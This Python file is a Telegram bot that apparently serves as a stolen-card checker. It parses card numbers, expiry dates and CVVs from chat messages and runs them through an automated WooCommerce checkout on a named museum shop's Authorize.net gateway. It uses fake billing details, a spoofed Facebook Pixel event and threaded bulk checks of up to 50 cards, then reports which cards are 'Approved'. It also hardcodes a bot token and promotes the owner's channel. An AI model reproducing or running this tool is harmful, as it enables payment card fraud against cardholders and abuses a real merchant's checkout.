import requests
from bs4 import BeautifulSoup
import time
import urllib.parse
import uuid
import re
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode
import json
import threading
from queue import Queue
import csv

# Telegram bot token
BOT_TOKEN = "8255137061:AAGOn6QWS7_IfUnH6vyZ7tZdSvHDs7mEdKk"

# Base URL
base_url = 'https://shop.tenement.org'

# Product details
product_id = 14392
product_sku = '015498'

# Headers to mimic cURL
headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'Accept': '*/*',
    'Accept-Language': 'en-ZA,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': base_url,
    'Referer': f'{base_url}/product/friends-to-keep-in-art-and-life/',
    'Sec-Ch-Ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'Sec-Ch-Ua-Mobile': '?1',
    'Sec-Ch-Ua-Platform': '"Android"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'X-Requested-With': 'XMLHttpRequest',
}

# Facebook Pixel headers
fb_headers = {
    'User-Agent': headers['User-Agent'],
    'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
    'Accept-Language': headers['Accept-Language'],
    'Referer': base_url + '/',
    'Sec-Ch-Ua': headers['Sec-Ch-Ua'],
    'Sec-Ch-Ua-Mobile': headers['Sec-Ch-Ua-Mobile'],
    'Sec-Ch-Ua-Platform': headers['Sec-Ch-Ua-Platform'],
    'Sec-Fetch-Dest': 'image',
    'Sec-Fetch-Mode': 'no-cors',
    'Sec-Fetch-Site': 'cross-site',
    'Attribution-Reporting-Eligible': 'event-source, trigger, not-navigation-source',
}

# Load BIN data from CSV
BIN_DATA = {}
try:
    with open('bins_all.csv', 'r', encoding='utf-8') as f:
        reader = csv.DictReader(f)
        for row in reader:
            BIN_DATA[str(row['number'])] = row
except FileNotFoundError:
    print("Warning: bins_all.csv not found. BIN lookup will not work.")

def get_bin_info(card_number: str) -> dict:
    """Get BIN information from the CSV data"""
    if not card_number:
        return None
    for length in [6, 8, 4]:
        bin_prefix = card_number[:length]
        if bin_prefix in BIN_DATA:
            return BIN_DATA[bin_prefix]
    return None

# Regex patterns for card details
CARD_PATTERNS = [
    r'(\d{16})[|;:,\s]+(\d{1,2})[|;:,\s]+(\d{2,4})[|;:,\s]+(\d{3,4})',
    r'(\d{15})[|;:,\s]+(\d{1,2})[|;:,\s]+(\d{2,4})[|;:,\s]+(\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[|;:,\s]+(\d{1,2})[|;:,\s]+(\d{2,4})[|;:,\s]+(\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[|;:,\s]+(\d{1,2})[|;:,\s]+(\d{2,4})[|;:,\s]+(\d{3,4})',
    r'(\d{16})[\s\|]+(\d{1,2})[\s\|]+(\d{2,4})[\s\|]+(\d{3,4})',
    r'(\d{15})[\s\|]+(\d{1,2})[\s\|]+(\d{2,4})[\s\|]+(\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[:\|](\d{1,2})[:\|](\d{2,4})[:\|](\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[:\|](\d{1,2})[:\|](\d{2,4})[:\|](\d{3,4})',
    r'(\d{16})[/](\d{1,2})[/](\d{2,4})[/](\d{3,4})',
    r'(\d{15})[/](\d{1,2})[/](\d{2,4})[/](\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[/](\d{1,2})[/](\d{2,4})[/](\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[/](\d{1,2})[/](\d{2,4})[/](\d{3,4})',
    r'(\d{16})[;\|](\d{1,2})[;\|](\d{2,4})[;\|](\d{3,4})',
    r'(\d{15})[;\|](\d{1,2})[;\|](\d{2,4})[;\|](\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[;\|](\d{1,2})[;\|](\d{2,4})[;\|](\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[;\|](\d{1,2})[;\|](\d{2,4})[;\|](\d{3,4})',
    r'(\d{16})[;\|/](\d{1,2})[;\|/](\d{2,4})[;\|/](\d{3,4})',
    r'(\d{15})[;\|/](\d{1,2})[;\|/](\d{2,4})[;\|/](\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[;\|/](\d{1,2})[;\|/](\d{2,4})[;\|/](\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[;\|/](\d{1,2})[;\|/](\d{2,4})[;\|/](\d{3,4})',
    r'(\d{16})[\s;\|/]+(\d{1,2})[\s;\|/]+(\d{2,4})[\s;\|/]+(\d{3,4})',
    r'(\d{15})[\s;\|/]+(\d{1,2})[\s;\|/]+(\d{2,4})[\s;\|/]+(\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[\s,\|/]+(\d{1,2})[\s,\|/]+(\d{2,4})[\s,\|/]+(\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[\s,\|/]+(\d{1,2})[\s,\|/]+(\d{2,4})[\s,\|/]+(\d{3,4})',
    r'(\d{16})[,\|](\d{1,2})[,\|](\d{2,4})[,\|](\d{3,4})',
    r'(\d{15})[,\|](\d{1,2})[,\|](\d{2,4})[,\|](\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[,\|](\d{1,2})[,\|](\d{2,4})[,\|](\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[,\|](\d{1,2})[,\|](\d{2,4})[,\|](\d{3,4})',
    r'(\d{16})[,\|/](\d{1,2})[,\|/](\d{2,4})[,\|/](\d{3,4})',
    r'(\d{15})[,\|/](\d{1,2})[,\|/](\d{2,4})[,\|/](\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[,\|/](\d{1,2})[,\|/](\d{2,4})[,\|/](\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[,\|/](\d{1,2})[,\|/](\d{2,4})[,\|/](\d{3,4})',
    r'(\d{16})[\s,\|/]+(\d{1,2})[\s,\|/]+(\d{2,4})[\s,\|/]+(\d{3,4})',
    r'(\d{15})[\s,\|/]+(\d{1,2})[\s,\|/]+(\d{2,4})[\s,\|/]+(\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[\s,\|/]+(\d{1,2})[\s,\|/]+(\d{2,4})[\s,\|/]+(\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[\s,\|/]+(\d{1,2})[\s,\|/]+(\d{2,4})[\s,\|/]+(\d{3,4})',
    r'(\d{16})[|;:,\s]+(\d{1,2})/(\d{2,4})[|;:,\s]+(\d{3,4})',
    r'(\d{15})[|;:,\s]+(\d{1,2})/(\d{2,4})[|;:,\s]+(\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[|;:,\s]+(\d{1,2})/(\d{2,4})[|;:,\s]+(\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[|;:,\s]+(\d{1,2})/(\d{2,4})[|;:,\s]+(\d{3,4})',
    r'(\d{16})[|;:,\s-]+(\d{1,2})-(\d{2,4})[|;:,\s-]+(\d{3,4})',
    r'(\d{15})[|;:,\s-]+(\d{1,2})-(\d{2,4})[|;:,\s-]+(\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[|;:,\s-]+(\d{1,2})-(\d{2,4})[|;:,\s-]+(\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[|;:,\s-]+(\d{1,2})-(\d{2,4})[|;:,\s-]+(\d{3,4})',
    r'(\d{16})\s*(\d{1,2})\s*(\d{2,4})\s*(\d{3,4})',
    r'(\d{15})\s*(\d{1,2})\s*(\d{2,4})\s*(\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})\s*(\d{1,2})\s*(\d{2,4})\s*(\d{3,4})',
    r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})\s*(\d{1,2})\s*(\d{2,4})\s*(\d{3,4})',
    r'(\d{16})[|;:,\s]+(\d{4})\s*[-/]\s*(\d{1,2})[|;:,\s]+(\d{3,4})',
    r'(\d{16})[|;:,\s]+(\d{2,4})\s*[-/]\s*(\d{1,2})[|;:,\s]+(\d{3,4})',
    r'(\d{16})\s+(\d{1,2})/(\d{2,4})\s+(\d{3,4})',
    r'(\d{16})\s+(\d{1,2})-(\d{2,4})\s+(\d{3,4})',
    r'(\d{16})\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*(\d{3,4})',
    r'(\d{16})\s*(\d{1,2})\s*-\s*(\d{2,4})\s*(\d{3,4})',
    r'(\d{4}[\s-]{0,1}\d{4}[\s-]{0,1}\d{4}[\s-]{0,1}\d{4})\s*(\d{1,2})\s*(\d{2,4})\s*(\d{3,4})',
    r'(\d{4}[\s-]{0,1}\d{4}[\s-]{0,1}\d{4}[\s-]{0,1}\d{3})\s*(\d{1,2})\s*(\d{2,4})\s*(\d{3,4})',
]

def extract_card_details(text: str) -> list:
    """Extract up to 50 sets of card details from text."""
    cards = []
    for pattern in CARD_PATTERNS:
        matches = re.findall(pattern, text)
        for match in matches:
            cc, mm, yy, cvv = match
            # Remove spaces/dashes from card number
            cc = re.sub(r'[\s-]', '', cc)
            # Normalize month to two digits
            mm = mm.zfill(2)
            # Normalize year to four digits
            if len(yy) == 2:
                yy = '20' + yy
            # Validate
            if (len(cc) in (13, 14, 15, 16) and
                1 <= int(mm) <= 12 and
                len(yy) == 4 and
                len(cvv) in (3, 4)):
                cards.append((cc, mm, yy, cvv))
        if len(cards) >= 50:  # Limit to 50 cards
            break
    return cards[:50]

def format_response_text(card_number: str, card_expiry_mm: str, card_expiry_yy: str, card_cvc: str, result: dict, execution_time: float) -> str:
    """Format the response text according to the specified style."""
    # Mask card number
    masked_card = f"{card_number[:4]}...{card_number[-4:]}"
    cc_display = f"{card_number}|{card_expiry_mm}|{card_expiry_yy[-2:]}|{card_cvc}"

    # Get BIN information
    bin_info = get_bin_info(card_number)

    # Determine status
    error_message = ""
    if result.get('error'):
        error_message = result['error']
    elif result.get('status') == 'failure':
        error_message = result.get('error', 'Unknown error')

    # Escape underscores for HTML
    error_message = error_message.replace('_', r'\_')

    # Remove "Status code" from error message
    error_message = re.sub(r'(?i)status code\s*', '', error_message)

    # Check for approved keywords
    is_approved = any(keyword.lower() in error_message.lower() for keyword in ['address', 'cvv', 'insufficient'])
    status_text = "<b>Approved ✅</b>" if is_approved else "<b>Declined ❌</b>"

    # Build response text
    response_text = f"{status_text}\n\n"
    response_text += f"<a href='https://t.me/spid_3r'>㊕</a> <b>CC ⇾</b> <code>{cc_display}</code>\n"
    response_text += f"<a href='https://t.me/spid_3r'>㊕</a> <b>Gateway ⇾</b> Authnet-14.95$\n"
    response_text += f"<a href='https://t.me/spid_3r'>㊕</a> <b>Response ⇾</b> {error_message}\n\n"

    # Add BIN info if available
    if bin_info:
        vendor = bin_info.get('vendor', 'N/A').upper()
        card_type = bin_info.get('type', 'N/A').upper()
        level = bin_info.get('level', '').upper() or 'N/A'
        response_text += f"<a href='https://t.me/spid_3r'>㊕</a> <b>BIN Info:</b> {vendor} - {card_type} - {level}\n"
        response_text += f"<a href='https://t.me/spid_3r'>㊕</a> <b>Bank:</b> {bin_info.get('bank_name', 'N/A')}\n"
        response_text += f"<a href='https://t.me/spid_3r'>㊕</a> <b>Country:</b> {bin_info.get('country', 'N/A')} {bin_info.get('flag', '')}\n\n"

    response_text += f"<a href='https://t.me/spid_3r'>㊕</a> <b>Took {execution_time:.2f} seconds</b>"
    return response_text

def run_checkout_flow(card_number: str, card_expiry_mm: str, card_expiry_yy: str, card_cvc: str, result_queue: Queue, start_time: float) -> None:
    """Run the checkout flow and store result in queue."""
    session = requests.Session()
    session.headers.update(headers)

    # Step 1: Add product to cart
    add_to_cart_url = f'{base_url}/?add-to-cart={product_id}'
    response = session.get(add_to_cart_url, params={'quantity': 1})
    if response.status_code != 200:
        result_queue.put((card_number, {'error': f'Failed to add to cart: {response.status_code}'}, time.time() - start_time))
        return

    # Step 2: Trigger Facebook Pixel AddToCart event
    fb_pixel_url = 'https://www.facebook.com/tr/'
    fb_params = {
        'id': '740309440158987',
        'ev': 'AddToCart',
        'dl': f'{base_url}/product/friends-to-keep-in-art-and-life/',
        'rl': f'{base_url}/product/friends-to-keep-in-art-and-life/',
        'if': 'false',
        'ts': int(time.time() * 1000),
        'cd[source]': 'woocommerce_7',
        'cd[version]': '10.0.4',
        'cd[pluginVersion]': '3.5.5',
        'cd[content_ids]': f'["{product_sku}_{product_id}"]',
        'cd[content_name]': 'Friends to Keep in Art and Life',
        'cd[content_type]': 'product',
        'cd[contents]': f'[{{"id":"{product_sku}_{product_id}","quantity":1}}]',
        'cd[value]': '14.95',
        'cd[currency]': 'USD',
        'sw': '385',
        'sh': '854',
        'v': '2.9.229',
        'r': 'stable',
        'a': 'woocommerce_7-10.0.4-3.5.5',
        'ec': '2',
        'o': '4126',
        'fbp': 'fb.1.1757546036880.180175118844154159',
        'ler': 'empty',
        'cdl': 'API_unavailable',
        'plt': '5645.200000047684',
        'it': int(time.time() * 1000 - 3000),
        'coo': 'false',
        'eid': str(uuid.uuid4()),
        'chmd': 'SM-A035F',
        'chpv': '13.0.0',
        'chfv': 'undefined',
        'ap[currency]': 'USD',
        'ap[contents]': f'[{{"item_price":14.95,"availability":"InStock","id":"{product_sku}"}}]',
        'expv2[]': ['pl1', 'el2', 'bc1'],
        'rqm': 'GET',
    }
    session.get(fb_pixel_url, headers=fb_headers, params=fb_params)

    # Step 3: Fetch get_refreshed_fragments
    fragments_url = f'{base_url}/?wc-ajax=get_refreshed_fragments'
    response = session.post(fragments_url, data={'time': int(time.time() * 1000)})
    if response.status_code != 200:
        result_queue.put((card_number, {'error': f'Failed to fetch fragments: {response.status_code}'}, time.time() - start_time))
        return

    # Step 4: Fetch checkout page to extract nonces
    checkout_url = f'{base_url}/checkout/'
    response = session.get(checkout_url)
    if response.status_code != 200:
        result_queue.put((card_number, {'error': f'Failed to fetch checkout: {response.status_code}'}, time.time() - start_time))
        return

    html = response.text
    soup = BeautifulSoup(html, 'html.parser')
    nonces = {}
    for input_tag in soup.find_all('input', type='hidden'):
        name = input_tag.get('name', '')
        if 'nonce' in name.lower():
            nonces[name] = input_tag.get('value', 'N/A')

    for script in soup.find_all('script'):
        script_content = script.string
        if script_content and 'wc_checkout_params' in script_content:
            match = re.search(r'"update_order_review_nonce":"([^"]+)"', script_content)
            if match:
                nonces['update_order_review_nonce'] = match.group(1)

    if not nonces.get('woocommerce-process-checkout-nonce'):
        result_queue.put((card_number, {'error': 'Missing woocommerce-process-checkout-nonce.'}, time.time() - start_time))
        return

    # Step 5: Update order review (if nonce available)
    if nonces.get('update_order_review_nonce'):
        update_url = f'{base_url}/?wc-ajax=update_order_review'
        update_data = {
            'security': nonces.get('update_order_review_nonce', ''),
            'payment_method': 'authnet',
            'country': 'US',
            'state': 'MD',
            'postcode': '20809',
            'city': 'Kai',
            'address': 'Yaya',
            'address_2': 'Kaka',
            's_country': 'US',
            's_state': 'MD',
            's_postcode': '20809',
            's_city': 'Kai',
            's_address': 'Yaya',
            's_address_2': 'Kaka',
            'has_full_address': 'true',
            'post_data': urllib.parse.urlencode({
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': f'{base_url}/my-account/',
                'wc_order_attribution_session_start_time': '2025-09-10 23:13:57',
                'wc_order_attribution_session_pages': '5',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': headers['User-Agent'],
                'billing_email': 'kennmatiangi@gmail.com',
                'billing_first_name': 'Kaka',
                'billing_last_name': 'Papa',
                'billing_company': '',
                'billing_country': 'US',
                'billing_address_1': 'Yaya',
                'billing_address_2': 'Kaka',
                'billing_city': 'Kai',
                'billing_state': 'MD',
                'billing_postcode': '20809',
                'billing_phone': '25473256984',
                'mailchimp_woocommerce_newsletter': '1',
                'mailchimp_woocommerce_gdpr[6fd1127ac3]': '0',
                'shipping_first_name': '',
                'shipping_last_name': '',
                'shipping_company': '',
                'shipping_country': 'US',
                'shipping_address_1': '',
                'shipping_address_2': '',
                'shipping_city': '',
                'shipping_state': 'MD',
                'shipping_postcode': '',
                'shipping_phone': '',
                'order_comments': '',
                'payment_method': 'authnet',
                'authnet-card-number': card_number,
                'authnet-card-expiry': f'{card_expiry_mm} / {card_expiry_yy}',
                'authnet-card-cvc': card_cvc,
                'woocommerce-process-checkout-nonce': nonces.get('woocommerce-process-checkout-nonce', ''),
                '_wp_http_referer': '/?wc-ajax=update_order_review'
            })
        }
        response = session.post(update_url, data=update_data)
        if response.status_code != 200:
            result_queue.put((card_number, {'error': f'Failed to update order review: {response.status_code}'}, time.time() - start_time))
            return

    # Step 6: Submit checkout
    checkout_url = f'{base_url}/?wc-ajax=checkout'
    checkout_data = {
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': f'{base_url}/my-account/',
        'wc_order_attribution_session_start_time': '2025-09-10 23:13:57',
        'wc_order_attribution_session_pages': '5',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': headers['User-Agent'],
        'billing_email': 'kennmatiangi@gmail.com',
        'billing_first_name': 'Kaka',
        'billing_last_name': 'Papa',
        'billing_company': '',
        'billing_country': 'US',
        'billing_address_1': 'Yaya',
        'billing_address_2': 'Kaka',
        'billing_city': 'Kai',
        'billing_state': 'MD',
        'billing_postcode': '20809',
        'billing_phone': '25473256984',
        'mailchimp_woocommerce_newsletter': '1',
        'mailchimp_woocommerce_gdpr[6fd1127ac3]': '0',
        'shipping_first_name': '',
        'shipping_last_name': '',
        'shipping_company': '',
        'shipping_country': 'US',
        'shipping_address_1': '',
        'shipping_address_2': '',
        'shipping_city': '',
        'shipping_state': 'MD',
        'shipping_postcode': '',
        'shipping_phone': '',
        'order_comments': '',
        'shipping_method[0]': 'local_pickup:12',
        'payment_method': 'authnet',
        'authnet-card-number': card_number,
        'authnet-card-expiry': f'{card_expiry_mm} / {card_expiry_yy}',
        'authnet-card-cvc': card_cvc,
        'woocommerce-process-checkout-nonce': nonces.get('woocommerce-process-checkout-nonce', ''),
        '_wp_http_referer': '/?wc-ajax=update_order_review'
    }
    response = session.post(checkout_url, data=checkout_data)
    execution_time = time.time() - start_time
    if response.status_code == 200:
        checkout_response = response.json()
        if checkout_response.get('result') == 'success':
            result_queue.put((card_number, {'status': 'success', 'response': checkout_response}, execution_time))
        else:
            error_message = checkout_response.get('messages', 'No messages provided')
            soup = BeautifulSoup(error_message, 'html.parser')
            clean_error = soup.get_text(strip=True)
            result_queue.put((card_number, {'status': 'failure', 'error': clean_error, 'response': checkout_response}, execution_time))
    else:
        result_queue.put((card_number, {'error': f'Failed to checkout: {response.status_code}'}, execution_time))

async def an_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /an or .an command for single card."""
    message_text = update.message.text
    reply_to_message = update.message.reply_to_message

    # Normalize command
    args = None
    if message_text.startswith('/an'):
        args = message_text[3:].strip()
    elif message_text.startswith('.an'):
        args = message_text[3:].strip()

    # Send Processing... message
    processing_message = await update.message.reply_text("<b>Please Wait...</b>", parse_mode=ParseMode.HTML)

    # Extract card details from command or replied message
    card_details = None
    if reply_to_message and reply_to_message.text:
        card_details = extract_card_details(reply_to_message.text)
        if card_details:
            card_details = card_details[0]  # Take first card
    if not card_details and args:
        card_details = extract_card_details(args)
        if card_details:
            card_details = card_details[0]

    if not card_details:
        await context.bot.edit_message_text(
            chat_id=processing_message.chat_id,
            message_id=processing_message.message_id,
            text=f"〈<a href='tg://user?id={update.effective_user.id}'>꫟</a>〉-» 𝘼𝙠𝙩𝙯 - Charge\n\n〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» Authorize.net\n\n<a href='tg://user?id={update.effective_user.id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /an cc|month|year|cvc",
            parse_mode=ParseMode.HTML
        )
        return

    card_number, card_expiry_mm, card_expiry_yy, card_cvc = card_details

    # Create inline keyboard
    keyboard = [
        [
            InlineKeyboardButton("CHANNEL", url="https://t.me/+v5XUCKwSzlE5MDU0"),
            InlineKeyboardButton("OWNER", url="https://t.me/spid_3r")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Run checkout flow
    start_time = time.time()
    result_queue = Queue()
    run_checkout_flow(card_number, card_expiry_mm, card_expiry_yy, card_cvc, result_queue, start_time)
    card_number, result, execution_time = result_queue.get()

    # Format response
    response_text = format_response_text(card_number, card_expiry_mm, card_expiry_yy, card_cvc, result, execution_time)

    # Edit Processing... message
    await context.bot.edit_message_text(
        chat_id=processing_message.chat_id,
        message_id=processing_message.message_id,
        text=response_text,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

async def man_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /man or .man command for multiple cards."""
    message_text = update.message.text
    reply_to_message = update.message.reply_to_message

    # Normalize command
    args = None
    if message_text.startswith('/man'):
        args = message_text[4:].strip()
    elif message_text.startswith('.man'):
        args = message_text[4:].strip()

    # Send Processing... message
    processing_message = await update.message.reply_text("<b>Please Wait... Processing mass check.</b>", parse_mode=ParseMode.HTML)

    # Extract card details
    cards = []
    if reply_to_message and reply_to_message.text:
        cards = extract_card_details(reply_to_message.text)
    if not cards and args:
        # Split by commas for command-line input
        card_strings = [card.strip() for card in args.split(',')]
        for card_str in card_strings:
            extracted = extract_card_details(card_str)
            cards.extend(extracted)

    if not cards:
        await context.bot.edit_message_text(
            chat_id=processing_message.chat_id,
            message_id=processing_message.message_id,
            text=f"〈<a href='tg://user?id={update.effective_user.id}'>꫟</a>〉-» 𝘼𝙠𝙩𝙯 - Charge\n\n〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» Authorize.net\n\n<a href='tg://user?id={update.effective_user.id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /an cc|month|year|cvc",
            parse_mode=ParseMode.HTML
        )
        return

    # Limit to 50 cards
    cards = cards[:50]
    result_queue = Queue()
    threads = []
    start_time = time.time()

    # Start a thread for each card
    for card_number, card_expiry_mm, card_expiry_yy, card_cvc in cards:
        thread = threading.Thread(
            target=run_checkout_flow,
            args=(card_number, card_expiry_mm, card_expiry_yy, card_cvc, result_queue, start_time)
        )
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    # Collect results
    results = []
    while not result_queue.empty():
        results.append(result_queue.get())

    # Create inline keyboard
    keyboard = [
        [
            InlineKeyboardButton("CHANNEL", url="https://t.me/+v5XUCKwSzlE5MDU0"),
            InlineKeyboardButton("OWNER", url="https://t.me/spid_3r")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Format response
    response_text = ""
    for card_number, result, execution_time in results:
        card_details = next((c for c in cards if c[0] == card_number), None)
        if card_details:
            card_number, card_expiry_mm, card_expiry_yy, card_cvc = card_details
            response_text += format_response_text(card_number, card_expiry_mm, card_expiry_yy, card_cvc, result, execution_time) + "\n\n"

    # Edit Processing... message
    await context.bot.edit_message_text(
        chat_id=processing_message.chat_id,
        message_id=processing_message.message_id,
        text=response_text.strip() or "No results to display.",
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

def main() -> None:
    """Run the bot."""
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler(['an', 'man'], an_command))
    application.add_handler(CommandHandler(['man'], man_command))
    application.add_handler(MessageHandler(filters.Regex(r'^\.an'), an_command))
    application.add_handler(MessageHandler(filters.Regex(r'^\.man'), man_command))
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
